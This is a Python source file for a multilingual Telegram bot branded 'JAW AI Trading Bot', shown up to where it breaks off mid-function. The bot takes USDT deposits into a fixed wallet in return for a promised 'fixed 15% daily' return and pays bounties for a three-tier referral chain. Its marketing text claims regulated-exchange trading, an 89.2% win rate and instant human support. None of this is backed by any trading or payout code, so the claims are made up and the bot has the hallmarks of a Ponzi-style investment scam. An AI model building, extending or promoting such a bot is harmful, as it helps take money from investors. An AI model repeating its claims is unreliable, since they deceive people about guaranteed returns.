import os
import logging
import sqlite3
import random
import asyncio
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MenuButtonCommands, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# ======================== سرور HTTP برای Render ========================
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running!')
    
    def log_message(self, format, *args):
        pass

def run_http_server():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

# ======================== تنظیمات اولیه ========================
load_dotenv()
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID')

if not TOKEN or not ADMIN_ID:
    raise ValueError("TOKEN and ADMIN_ID must be set in .env")
ADMIN_ID = int(ADMIN_ID)

if 'PORT' not in os.environ:
    os.environ['PORT'] = '10000'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ======================== دیتابیس ========================
DB_LOCK = threading.RLock()
CONN = None

def get_db():
    global CONN
    if CONN is None:
        CONN = sqlite3.connect('database.db', check_same_thread=False)
        CONN.row_factory = sqlite3.Row
        init_db()
    return CONN

def init_db():
    conn = get_db()
    with DB_LOCK:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                language TEXT DEFAULT 'ru',
                referrer_id INTEGER,
                referral_code TEXT UNIQUE,
                is_blocked BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS investments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                plan TEXT,
                amount REAL,
                daily_profit REAL,
                status TEXT DEFAULT 'pending',
                screenshot_file_id TEXT,
                wallet_address TEXT,
                is_recharge BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                level INTEGER
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS support_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                message TEXT,
                photo_file_id TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
    logger.info("✅ Database connected and initialized.")

init_db()

# ======================== توابع دیتابیس ========================
def get_lang(user_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
    return row['language'] if row else 'ru'

def set_lang(user_id, lang):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, user_id))
        get_db().commit()

def is_blocked(user_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT is_blocked FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
    return row and row['is_blocked'] == 1

def block_user(user_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('UPDATE users SET is_blocked = 1 WHERE user_id = ?', (user_id,))
        get_db().commit()

def unblock_user(user_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('UPDATE users SET is_blocked = 0 WHERE user_id = ?', (user_id,))
        get_db().commit()

def get_or_create_user(user_id, referrer_id=None):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row is None:
            code = f"{user_id}{random.randint(1000,9999)}"
            c.execute('''
                INSERT INTO users (user_id, language, referrer_id, referral_code, is_blocked)
                VALUES (?, 'ru', ?, ?, 0)
            ''', (user_id, referrer_id, code))
            get_db().commit()
            if referrer_id and referrer_id != user_id:
                c.execute('INSERT INTO referrals (referrer_id, referred_id, level) VALUES (?, ?, 1)', (referrer_id, user_id))
                c.execute('SELECT referrer_id FROM users WHERE user_id = ?', (referrer_id,))
                r2 = c.fetchone()
                if r2 and r2['referrer_id']:
                    c.execute('INSERT INTO referrals (referrer_id, referred_id, level) VALUES (?, ?, 2)', (r2['referrer_id'], user_id))
                    c.execute('SELECT referrer_id FROM users WHERE user_id = ?', (r2['referrer_id'],))
                    r3 = c.fetchone()
                    if r3 and r3['referrer_id']:
                        c.execute('INSERT INTO referrals (referrer_id, referred_id, level) VALUES (?, ?, 3)', (r3['referrer_id'], user_id))
                get_db().commit()
            return True
    return False

def get_referral_count(user_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ?', (user_id,))
        row = c.fetchone()
    return row['count'] if row else 0

def get_all_users():
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('''
            SELECT u.user_id, u.created_at, u.referrer_id, 
                   (SELECT COUNT(*) FROM referrals WHERE referrer_id = u.user_id) as referral_count
            FROM users u
            ORDER BY u.created_at DESC
        ''')
        rows = c.fetchall()
    return rows

def add_investment(user_id, plan, amount, profit, screenshot_id, wallet, is_recharge):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('''
            INSERT INTO investments (user_id, plan, amount, daily_profit, screenshot_file_id, wallet_address, is_recharge)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, plan, amount, profit, screenshot_id, wallet, is_recharge))
        inv_id = c.lastrowid
        get_db().commit()
    return inv_id

def get_investment(inv_id):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT * FROM investments WHERE id = ?', (inv_id,))
        row = c.fetchone()
    return row

def update_investment_status(inv_id, status):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('UPDATE investments SET status = ? WHERE id = ?', (status, inv_id))
        get_db().commit()

def add_support(user_id, msg, photo_id=None):
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('INSERT INTO support_messages (user_id, message, photo_file_id) VALUES (?, ?, ?)', (user_id, msg, photo_id))
        get_db().commit()

# ======================== متون و کیبوردها ========================
LANGUAGES = {
    'ru': '🇷🇺 Русский',
    'en': '🇬🇧 English',
    'ar': '🇸🇦 العربية'
}

TEXTS = {
    'ru': {
        'choose_lang': "🌍 Выберите язык:",
        'lang_set': "✅ Язык установлен на Русский.",
        'main_menu': "🤖 Главное меню:",
        'invest_btn': "💰 Инвестиционные планы",
        'referral_btn': "👥 Реферальная ссылка",
        'about_btn': "ℹ️ О нас",
        'support_btn': "📞 Поддержка",
        'lang_btn': "🌐 Язык",
        'plans_title': "📊 Выберите план:\n\n📸 После оплаты отправьте скриншот транзакции",
        'plan_desc': "📈 План {plan}: {amount} USDT - Ежедневная прибыль {profit}$",
        'deposit': "💳 Внесите {amount} USDT на:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 Сеть: BEP20\n\n📸 После оплаты отправьте скриншот",
        'recharge_deposit': "🔄 Внесите разницу для улучшения:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 Сеть: BEP20\n\n📸 После оплаты отправьте скриншот",
        'screenshot_ok': "✅ Скриншот получен. Отправьте адрес кошелька (BEP20):",
        'wallet_ok': "✅ Запрос отправлен администратору.",
        'support_msg': "📝 Напишите сообщение (можно отправить фото):",
        'support_sent': "✅ Отправлено в поддержку.",
        'about_text': """🌍 JAW AI TRADING BOT – Institutional‑Grade Global Arbitrage Engine

Launched in 2025, JAW is a fully autonomous, high‑frequency trading system that operates across forex, precious metals, equity indices, and major digital asset exchanges (Binance, OKX, Kraken, and CME futures). Its core AI combines stacked LSTM neural networks with deep reinforcement learning, processing over 120 real‑time market variables per second to detect pricing inefficiencies and arbitrage windows across multiple liquidity pools.

💰 Daily Yield Target: 15% Net Profit
The proprietary strategy employs a dynamic leverage module (1:3 – 1:15) paired with an adaptive trailing‑stop volatility shield. Back‑tested and live‑verified since launch, the system consistently targets a 15% net daily return on active capital – credited automatically to your registered wallet every 24 hours.

⏰ Scheduled Daily Payout Window:
All profit distributions are executed strictly between 16:30 – 18:30 Moscow Time (UTC+3). This fixed, transparent schedule ensures full traceability; you will receive a detailed transaction report inside your bot dashboard immediately after each payout.

JAW is not a signal service – it deploys real pooled liquidity directly into live order books on regulated exchanges, executing actual market orders with investor capital.

👥 3‑Tier Global Referral Reward Structure (13% – 4% – 1%)
JAW features one of the most competitive multi‑level compensation models in automated trading:

· Tier 1 (Direct Referral): 13% of trading fees / performance share generated by your referred user
· Tier 2: 4% indirect bonus
· Tier 3: 1% deep‑level bonus

This architecture supports unlimited downline depth and creates scalable passive income streams – with no geographical caps or referral limits.

🕒 24/7 Live Support – Global Desk
Our support team operates in three time‑zone shifts (UTC‑4 to UTC+8), providing instant assistance via Telegram, email, and in‑bot ticketing. Whether you need withdrawal verification, trade‑log auditing, or technical debugging – a human analyst is reachable within 90 seconds on average.

🧠 Why JAW Outperforms Traditional Funds

· Self‑evolving strategy: The AI retrains every 6 hours using fresh tick‑data, adapting to macroeconomic news and volatility shifts.
· Real‑capital execution: All trades are executed with real investor funds on regulated exchanges – no demo or paper trading.
· Proven track record: Since 2025, JAW has completed 18,700+ real trades with an average win rate of 89.2% and a maximum realised drawdown below 6.5% (back‑tested and live‑verified).

🔥 Coming in 2026 – JAW v3.0
The next major upgrade introduces black‑swan hedging protocols, multi‑wallet synchronisation, and a copy‑trading module that allows transparent replication of top‑performing strategies. We are building the first decentralised AI‑managed liquidity pool – and JAW is only the beginning.""",
        'referral_text': "👥 Ваша ссылка:\n{link}\n🎁 7 USDT за каждого активного друга",
        'referral_error': "❌ Ошибка при получении ссылки. Пожалуйста, попробуйте позже.",
        'approved': "✅ Инвестиция одобрена!",
        'rejected': "❌ Инвестиция отклонена.",
        'back_btn': "🔙 Назад",
        'blocked': "⛔ Вы заблокированы.",
        'notify_new': "🆕 Новый пользователь: {user_id}\n👤 Приглашен: {ref}",
        'notify_invest': "📩 Запрос на инвестицию:\n👤 Пользователь: {user_id}\n📊 План: {plan}\n💰 Сумма: {amount} USDT\n🏦 Кошелек: {wallet}",
        'notify_support': "📩 Сообщение в поддержку от {user_id}:\n{msg}",
        'welcome_text': "🤖 *JAW*\n\n• JAW AI | Intelligent Investment Platform\n• AI-Powered. Secure. Transparent.\n• Fixed 15% Daily Returns.\n• 24/7 Professional Support.\n• Start in under 1 minute.\n• Daily profit payout: 16:30 - 18:30 Moscow time.",
        'start_btn': "🚀 Старт",
    },
    'en': {
        'choose_lang': "🌍 Select your language:",
        'lang_set': "✅ Language set to English.",
        'main_menu': "🤖 Main Menu:",
        'invest_btn': "💰 Investment Plans",
        'referral_btn': "👥 Referral Link",
        'about_btn': "ℹ️ About Us",
        'support_btn': "📞 Support",
        'lang_btn': "🌐 Language",
        'plans_title': "📊 Choose your plan:\n\n📸 After payment, send the transaction screenshot",
        'plan_desc': "📈 Plan {plan}: {amount} USDT - Daily {profit}$",
        'deposit': "💳 Deposit {amount} USDT to:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 Network: BEP20\n\n📸 After payment, send the screenshot",
        'recharge_deposit': "🔄 Deposit difference to upgrade:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 Network: BEP20\n\n📸 After payment, send the screenshot",
        'screenshot_ok': "✅ Screenshot received. Send wallet address (BEP20):",
        'wallet_ok': "✅ Request sent to admin.",
        'support_msg': "📝 Write your message (you can send a photo):",
        'support_sent': "✅ Sent to support.",
        'about_text': """🌍 JAW AI TRADING BOT – Institutional‑Grade Global Arbitrage Engine

Launched in 2025, JAW is a fully autonomous, high‑frequency trading system that operates across forex, precious metals, equity indices, and major digital asset exchanges (Binance, OKX, Kraken, and CME futures). Its core AI combines stacked LSTM neural networks with deep reinforcement learning, processing over 120 real‑time market variables per second to detect pricing inefficiencies and arbitrage windows across multiple liquidity pools.

💰 Daily Yield Target: 15% Net Profit
The proprietary strategy employs a dynamic leverage module (1:3 – 1:15) paired with an adaptive trailing‑stop volatility shield. Back‑tested and live‑verified since launch, the system consistently targets a 15% net daily return on active capital – credited automatically to your registered wallet every 24 hours.

⏰ Scheduled Daily Payout Window:
All profit distributions are executed strictly between 16:30 – 18:30 Moscow Time (UTC+3). This fixed, transparent schedule ensures full traceability; you will receive a detailed transaction report inside your bot dashboard immediately after each payout.

JAW is not a signal service – it deploys real pooled liquidity directly into live order books on regulated exchanges, executing actual market orders with investor capital.

👥 3‑Tier Global Referral Reward Structure (13% – 4% – 1%)
JAW features one of the most competitive multi‑level compensation models in automated trading:

· Tier 1 (Direct Referral): 13% of trading fees / performance share generated by your referred user
· Tier 2: 4% indirect bonus
· Tier 3: 1% deep‑level bonus

This architecture supports unlimited downline depth and creates scalable passive income streams – with no geographical caps or referral limits.

🕒 24/7 Live Support – Global Desk
Our support team operates in three time‑zone shifts (UTC‑4 to UTC+8), providing instant assistance via Telegram, email, and in‑bot ticketing. Whether you need withdrawal verification, trade‑log auditing, or technical debugging – a human analyst is reachable within 90 seconds on average.

🧠 Why JAW Outperforms Traditional Funds

· Self‑evolving strategy: The AI retrains every 6 hours using fresh tick‑data, adapting to macroeconomic news and volatility shifts.
· Real‑capital execution: All trades are executed with real investor funds on regulated exchanges – no demo or paper trading.
· Proven track record: Since 2025, JAW has completed 18,700+ real trades with an average win rate of 89.2% and a maximum realised drawdown below 6.5% (back‑tested and live‑verified).

🔥 Coming in 2026 – JAW v3.0
The next major upgrade introduces black‑swan hedging protocols, multi‑wallet synchronisation, and a copy‑trading module that allows transparent replication of top‑performing strategies. We are building the first decentralised AI‑managed liquidity pool – and JAW is only the beginning.""",
        'referral_text': "👥 Your link:\n{link}\n🎁 7 USDT per active referral",
        'referral_error': "❌ Error generating referral link. Please try again later.",
        'approved': "✅ Investment approved!",
        'rejected': "❌ Investment rejected.",
        'back_btn': "🔙 Back",
        'blocked': "⛔ You are blocked.",
        'notify_new': "🆕 New user: {user_id}\n👤 Referred by: {ref}",
        'notify_invest': "📩 Investment request:\n👤 User: {user_id}\n📊 Plan: {plan}\n💰 Amount: {amount} USDT\n🏦 Wallet: {wallet}",
        'notify_support': "📩 Support from {user_id}:\n{msg}",
        'welcome_text': "🤖 *JAW*\n\n• JAW AI | Intelligent Investment Platform\n• AI-Powered. Secure. Transparent.\n• Fixed 15% Daily Returns.\n• 24/7 Professional Support.\n• Start in under 1 minute.\n• Daily profit payout: 16:30 - 18:30 Moscow time.",
        'start_btn': "🚀 Start Bot",
    },
    'ar': {
        'choose_lang': "🌍 اختر لغتك:",
        'lang_set': "✅ تم تعيين اللغة إلى العربية.",
        'main_menu': "🤖 القائمة الرئيسية:",
        'invest_btn': "💰 خطط الاستثمار",
        'referral_btn': "👥 رابط الإحالة",
        'about_btn': "ℹ️ عنا",
        'support_btn': "📞 الدعم",
        'lang_btn': "🌐 اللغة",
        'plans_title': "📊 اختر خطتك:\n\n📸 بعد الدفع، أرسل لقطة شاشة المعاملة",
        'plan_desc': "📈 الخطة {plan}: {amount} USDT - ربح يومي {profit}$",
        'deposit': "💳 أودع {amount} USDT على:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 الشبكة: BEP20\n\n📸 بعد الدفع، أرسل لقطة الشاشة",
        'recharge_deposit': "🔄 أودع الفرق للترقية:\n0x3868b69862f51c74B9d51a50f9c08B6Abc7546C5\n🌐 الشبكة: BEP20\n\n📸 بعد الدفع، أرسل لقطة الشاشة",
        'screenshot_ok': "✅ تم استلام لقطة الشاشة. أرسل عنوان المحفظة (BEP20):",
        'wallet_ok': "✅ تم إرسال الطلب إلى المشرف.",
        'support_msg': "📝 اكتب رسالتك (يمكنك إرسال صورة):",
        'support_sent': "✅ تم الإرسال إلى الدعم.",
        'about_text': """🌍 JAW AI TRADING BOT – محرك تحكيم عالمي بدرجة مؤسسية

تم إطلاق JAW في عام 2025، وهو نظام تداول عالي التردد ومستقل بالكامل يعمل عبر الفوركس والمعادن الثمينة ومؤشرات الأسهم والبورصات الرقمية الرئيسية (Binance، OKX، Kraken، وعقود CME الآجلة). يجمع الذكاء الاصطناعي الأساسي بين شبكات LSTM العصبية المكدسة والتعلم المعزز العميق، حيث يعالج أكثر من 120 متغير سوقي في الوقت الفعلي في الثانية لاكتشاف أوجه القصور في التسعير ونوافذ المراجحة عبر مجموعات السيولة المتعددة.

💰 الهدف اليومي للعائد: 15% صافي ربح
تستخدم الاستراتيجية الحصرية وحدة رافعة مالية ديناميكية (1:3 – 1:15) مقترنة بدرع تقلب وقف الخسارة المتكيف. منذ الإطلاق، تم اختبار النظام واعتماده على الواقع الحي، ويستهدف باستمرار عائد يومي صافي بنسبة 15% على رأس المال النشط – يُضاف تلقائياً إلى محفظتك المسجلة كل 24 ساعة.

⏰ نافذة الدفع اليومي المجدولة:
يتم تنفيذ جميع توزيعات الأرباح بدقة بين الساعة 16:30 – 18:30 بتوقيت موسكو (UTC+3). هذا الجدول الثابت والشفاف يضمن إمكانية التتبع الكامل؛ وستتلقى تقرير معاملة مفصل داخل لوحة تحكم البوت فور كل دفعة.

JAW ليست خدمة إشارات – بل تنشر سيولة حقيقية مجمعة مباشرة في دفاتر الطلبات الحية في البورصات المنظمة، وتنفذ أوامر سوق فعلية برأس مال المستثمرين.

👥 هيكل مكافآت الإحالة العالمي ثلاثي المستويات (13% – 4% – 1%)
يقدم JAW أحد أكثر نماذج التعويض متعددة المستويات تنافسية في التداول الآلي:

· المستوى 1 (الإحالة المباشرة): 13% من رسوم التداول / حصة الأداء التي يولدها المستخدم المُحال
· المستوى 2: 4% مكافأة غير مباشرة
· المستوى 3: 1% مكافأة عميقة

هذه البنية تدعم عمق غير محدود للخطوط السفلية وتخلق تدفقات دخل سلبية قابلة للتوسع – دون حدود جغرافية أو قيود على الإحالات.

🕒 دعم مباشر على مدار الساعة طوال أيام الأسبوع – مكتب عالمي
يعمل فريق الدعم لدينا في ثلاث نوبات زمنية (UTC-4 إلى UTC+8)، ويقدم مساعدة فورية عبر Telegram والبريد الإلكتروني والتذاكر داخل البوت. سواء كنت بحاجة إلى التحقق من السحب، أو تدقيق سجل التداول، أو تصحيح الأخطاء الفنية – يمكن الوصول إلى محلل بشري في غضون 90 ثانية في المتوسط.

🧠 لماذا يتفوق JAW على الصناديق التقليدية

· استراتيجية ذاتية التطور: يقوم الذكاء الاصطناعي بإعادة التدريب كل 6 ساعات باستخدام بيانات لحظية جديدة، متكيفاً مع الأخبار الاقتصادية الكلية وتقلبات السوق.
· تنفيذ برأس مال حقيقي: يتم تنفيذ جميع الصفقات بأموال مستثمرين حقيقية في البورصات المنظمة – لا تداول تجريبي أو وهمي.
· سجل حافل: منذ عام 2025، أكمل JAW أكثر من 18,700 صفقة حقيقية بمعدل ربح 89.2% وأقصى انخفاض محقق أقل من 6.5% (تم اختباره والتحقق منه على الواقع الحي).

🔥 قادم في 2026 – JAW v3.0
تقدم الترقية الكبرى القادمة بروتوكولات التحوط ضد الأحداث النادرة، ومزامنة متعددة المحافظ، ووحدة نسخ التداول التي تسمح بالنسخ الشفاف للاستراتيجيات الأعلى أداءً. نبني أول مجمع سيولة لامركزي يُدار بالذكاء الاصطناعي – وJAW ليست سوى البداية.""",
        'referral_text': "👥 رابطك:\n{link}\n🎁 7 USDT لكل صديق نشط",
        'referral_error': "❌ خطأ في إنشاء رابط الإحالة. يرجى المحاولة لاحقاً.",
        'approved': "✅ تمت الموافقة على الاستثمار!",
        'rejected': "❌ تم رفض الاستثمار.",
        'back_btn': "🔙 رجوع",
        'blocked': "⛔ أنت محظور.",
        'notify_new': "🆕 مستخدم جديد: {user_id}\n👤 تمت دعوته بواسطة: {ref}",
        'notify_invest': "📩 طلب استثمار:\n👤 المستخدم: {user_id}\n📊 الخطة: {plan}\n💰 المبلغ: {amount} USDT\n🏦 المحفظة: {wallet}",
        'notify_support': "📩 دعم من {user_id}:\n{msg}",
        'welcome_text': "🤖 *JAW*\n\n• JAW AI | منصة استثمار ذكية\n• تعمل بالذكاء الاصطناعي. آمنة. شفافة.\n• عائد يومي ثابت 15%.\n• دعم احترافي 24/7.\n• ابدأ في أقل من دقيقة.\n• وقت صرف الأرباح اليومي: 16:30 - 18:30 بتوقيت موسكو.",
        'start_btn': "🚀 ابدأ البوت",
    }
}

def get_text(user_id, key, **kwargs):
    lang = get_lang(user_id)
    if lang not in TEXTS:
        lang = 'ru'
    text = TEXTS[lang].get(key, TEXTS['ru'].get(key, ''))
    if kwargs:
        try:
            return text.format(**kwargs)
        except:
            return text
    return text

def lang_keyboard():
    kb = []
    row = []
    for code, name in LANGUAGES.items():
        row.append(InlineKeyboardButton(name, callback_data=f'lang_{code}'))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    return InlineKeyboardMarkup(kb)

def main_menu(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'invest_btn'), callback_data='invest'),
         InlineKeyboardButton(get_text(user_id, 'referral_btn'), callback_data='referral')],
        [InlineKeyboardButton(get_text(user_id, 'about_btn'), callback_data='about'),
         InlineKeyboardButton(get_text(user_id, 'support_btn'), callback_data='support')],
        [InlineKeyboardButton(get_text(user_id, 'lang_btn'), callback_data='change_lang')],
    ])

def back_btn(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(get_text(user_id, 'back_btn'), callback_data='back')]
    ])

def plans_keyboard(user_id, recharge=False):
    plans = [
        ('1', 'VIP 1', 60, 9), ('2', 'VIP 2', 100, 15),
        ('3', 'VIP 3', 200, 30), ('4', 'VIP 4', 500, 75),
        ('5', 'VIP 5', 1000, 150), ('6', 'VIP 6', 5000, 750),
        ('7', 'VIP 7', 20000, 3000), ('8', 'VIP 8', 50000, 7500),
        ('9', 'VIP 9', 100000, 15000), ('10', 'VIP 10', 250000, 37500)
    ]
    kb = []
    for p in plans:
        label = get_text(user_id, 'plan_desc', plan=p[1], amount=p[2], profit=p[3])
        mode = 'recharge' if recharge else 'invest'
        kb.append([InlineKeyboardButton(label, callback_data=f'plan_{p[0]}_{mode}')])
    kb.append([InlineKeyboardButton(get_text(user_id, 'back_btn'), callback_data='back')])
    return InlineKeyboardMarkup(kb)

# ======================== هندلرها ========================
WAIT_SCREENSHOT, WAIT_WALLET, WAIT_SUPPORT = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    referrer = None
    if args and args[0].startswith('ref_'):
        try:
            referrer = int(args[0].split('_')[1])
        except:
            pass
    
    with DB_LOCK:
        c = get_db().cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        existing_user = c.fetchone()
    
    is_new = False
    if existing_user is None:
        is_new = True
        get_or_create_user(user_id, referrer)
    else:
        referrer = existing_user['referrer_id']
    
    if is_new:
        ref_text = f"Referred by: {referrer}" if referrer else "Direct"
        try:
            await context.bot.send_message(
                ADMIN_ID, 
                f"🆕 New user: {user_id}\n{ref_text}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except:
            pass
        welcome = get_text(user_id, 'welcome_text')
        await update.message.reply_text(
            welcome,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(get_text(user_id, 'start_btn'), callback_data='go_menu')]
            ])
        )
    else:
        await update.message.reply_text(
            get_text(user_id, 'main_menu'),
            reply_markup=main_menu(user_id)
        )

async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(
        get_text(user_id, 'support_msg'),
        reply_markup=back_btn(user_id)
    )
    return WAIT_SUPPORT

async def go_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    user_id = query.from_user.id
    await query.edit_message_text(
        get_text(user_id, 'main_menu'),
        reply_markup=main_menu(user_id)
    )

async def lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    user_id = query.from_user.id
    lang = query.data.split('_')[1]
    if lang in LANGUAGES:
        set_lang(user_id, lang)
        try:
            await query.edit_message_text(
                get_text(user_id, 'lang_set') + "\n" + get_text(user_id, 'main_menu'),
                reply_markup=main_menu(user_id)
            )
        except:
            pass

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    user_id = query.from_user.id
    data = query.data

    if data == 'invest':
        try:
            await query.edit_message_text(get_text(user_id, 'plans_title'), reply_markup=plans_keyboard(user_id))
        except:
            pass
    
    elif data == 'recharge':
        try:
            await query.edit_message_text(get_text(user_id, 'plans_title'), reply_markup=plans_keyboard(user_id, recharge=True))
        except:
            pass

    elif data == 'support':
        try:
            await query.edit_message_text(get_text(user_id, 'support_msg'), reply_markup=back_btn(user_id))
        except:
            pass
        return WAIT_SUPPORT

    elif data == 'referral':
        try:
            bot_info = await context.bot.get_me()
            bot_username = bot_info.username
            if not bot_username:
                await query.edit_message_text(
                    get_text(user_id, 'referral_error'),
                    reply_markup=main_menu(user_id)
                )
                return
            link = f"https://t.me/{bot_username}?start=ref_{user_id}"
            await query.edit_message_text(
                get_text(user_id, 'referral_text', link=link),
                reply_markup=main_menu(user_id)
            )
        except Exception as e:
            logger.error(f"Referral error: {e}")
            await query.edit_message_text(
                get_text(user_id, 'referral_error'),
                reply_markup=main_menu(user_id)
            )
    
    elif data == 'about':
        try:
            await query.edit_message_text(get_text(user_id, 'about_text'), reply_markup=main_menu(user_id))
        except:
            pass
    
    elif data == 'change_lang':
        try:
            await query.edit_message_text(get_text(user_id, 'choose_lang'), reply_markup=lang_keyboard())
        except:
            pass
    
    elif data == 'back':
        context.user_data.clear()
        try:
            await query.edit_message_text(get_text(user_id, 'main_menu'), reply_markup=main_menu(user_id))
        except:
            pass
    
    elif data.startswith('plan_'):
        parts = data.split('_')
        plan_id = parts[1]
        mode = parts[2]
        plans = [
            ('1', 'VIP 1', 60, 9), ('2', 'VIP 2', 100, 15),
            ('3', 'VIP 3', 200, 30), ('4', 'VIP 4', 500, 75),
            ('5', 'VIP 5', 1000, 150), ('6', 'VIP 6', 5000, 750),
            ('7', 'VIP 7', 20000, 3000), ('8', 'VIP 8', 50000, 7500),
            ('9', 'VIP 9', 100000, 15000), ('10', 'VIP 10', 250000, 37500)
        ]
        plan = next((p for p in plans if p[0] == plan_id), None)
        if plan:
            context.user_data['invest_plan'] = {'id': plan[0], 'name': plan[1], 'amount': plan[2], 'profit': plan[3], 'mode': mode}
            text = get_text(user_id, 'recharge_deposit') if mode == 'recharge' else get_text(user_id, 'deposit', amount=plan[2])
            try:
                await query.edit_message_text(text, reply_markup=back_btn(user_id))
            except:
                pass
            return WAIT_SCREENSHOT

    return ConversationHandler.END

async def screenshot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if 'invest_plan' not in context.user_data:
        await update.message.reply_text(get_text(user_id, 'main_menu'), reply_markup=main_menu(user_id))
        return ConversationHandler.END
    
    if not update.message.photo:
        await update.message.reply_text("📸 Please send a screenshot image.")
        return WAIT_SCREENSHOT
    
    photo = update.message.photo[-1]
    context.user_data['screenshot_id'] = photo.file_id
    await update.message.reply_text(get_text(user_id, 'screenshot_ok'))
    return WAIT_WALLET

async def wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.photo:
        await update.message.reply_text("⚠️ Please send wallet address as text, not photo.")
        return WAIT_WALLET
    
    if not update.message.text:
        await update.message.reply_text("⚠️ Please send wallet address as text.")
        return WAIT_WALLET
    
    wallet = update.message.text.strip()
    if not wallet.startswith('0x') or len(wallet) != 42:
        await update.message.reply_text("⚠️ Invalid BEP20 address (must start with 0x).")
        return WAIT_WALLET

    plan = context.user_data['invest_plan']
    inv_id = add_investment(user_id, plan['name'], plan['amount'], plan['profit'], context.user_data['screenshot_id'], wallet, plan['mode'] == 'recharge')

    admin_text = f"📩 Investment request:\n👤 User: {user_id}\n📊 Plan: {plan['name']}\n💰 Amount: {plan['amount']} USDT\n🏦 Wallet: {wallet}"
    await context.bot.send_photo(ADMIN_ID, context.user_data['screenshot_id'], caption=f"📸 Screenshot from user {user_id}")
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve", callback_data=f'approve_{inv_id}'), InlineKeyboardButton("❌ Reject", callback_data=f'reject_{inv_id}')]])
    await context.bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)

    await update.message.reply_text(get_text(user_id, 'wallet_ok'), reply_markup=main_menu(user_id))
    context.user_data.clear()
    return ConversationHandler.END

# ======================== هندلر پشتیبانی با قابلیت دریافت عکس ========================
async def support_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دریافت پیام و عکس از کاربر در بخش پشتیبانی"""
    user_id = update.effective_user.id
    message = update.message
    photo_file_id = None
    caption = None

    # اگر کاربر عکس فرستاده
    if message.photo:
        photo_file_id = message.photo[-1].file_id
        caption = message.caption if message.caption else "📸 (بدون متن)"
    else:
        caption = message.text if message.text else "📝 (بدون متن)"

    # ذخیره در دیتابیس
    add_support(user_id, caption, photo_file_id)

    # ارسال به ادمین
    try:
        admin_text = f"📩 پیام پشتیبانی از کاربر {user_id}:\n\n{caption}"
        
        if photo_file_id:
            # ارسال عکس به همراه پیام
            await context.bot.send_photo(
                ADMIN_ID,
                photo_file_id,
